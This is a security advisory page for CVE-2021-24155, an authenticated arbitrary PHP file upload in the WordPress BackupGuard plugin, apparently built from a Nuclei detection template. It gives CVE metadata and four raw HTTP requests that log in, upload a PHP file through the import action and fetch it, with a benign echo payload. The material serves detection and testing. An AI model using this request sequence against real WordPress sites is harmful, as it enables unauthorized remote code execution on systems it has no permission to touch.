---
layout: post
cve_id: CVE-2021-24155
title: WordPress BackupGuard <1.6.0 - Authenticated Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2021/CVE-2021-24155.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-24155.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: high
impact: 'Remote code execution

  '
remediation: Fixed in version 1.6.0.
reference:
- https://wpscan.com/vulnerability/d442acac-4394-45e4-b6bb-adf4a40960fb
- https://wordpress.org/plugins/backup/
- https://nvd.nist.gov/vuln/detail/CVE-2021-24155
- http://packetstormsecurity.com/files/163382/WordPress-Backup-Guard-1.5.8-Shell-Upload.html
- https://github.com/0dayNinja/CVE-2021-24155.rb
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 7.2
  cve-id: CVE-2021-24155
  cwe-id: CWE-434
  epss-score: 0.93251
  epss-percentile: 0.9979
  cpe: cpe:2.3:a:backup-guard:backup_guard:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 4
  vendor: backup-guard
  product: backup_guard
  framework: wordpress
tags:
- cve
- cve2021
- authenticated
- wp
- packetstorm
- wp-plugin
- rce
- wordpress
- backup
- wpscan
- intrusive
- backup-guard
- vuln
---

## ðŸ” Vulnerability Description
WordPress Backup Guard plugin before 1.6.0 is susceptible to authenticated arbitrary file upload. The plugin does not ensure that imported files are in SGBP format and extension, allowing high-privilege users to upload arbitrary files, including PHP, possibly leading to remote code execution.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
log=XZXvX1&pwd=kWcgUT&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/admin.php?page=backup_guard_backups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php?action=backup_guard_importBackup&token=8X22rZ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0, Win64, x64, rv:140.0) Gecko/20100101 Firefox/140.0
Connection: close
Content-Length: 292
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=---------------------------204200867127808062083805313921
Accept-Encoding: gzip
-----------------------------204200867127808062083805313921
Content-Disposition: form-data; name="files[]"; filename="38FG3F8sscBFHUnrOs9xDlSnylA.php"
Content-Type: application/x-php
<?php
echo "CVE-2021-24155";
?>
-----------------------------204200867127808062083805313921--
```

```nohighlight
GET /wp-content/uploads/backup-guard/38FG3F8sscBFHUnrOs9xDlSnylA.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

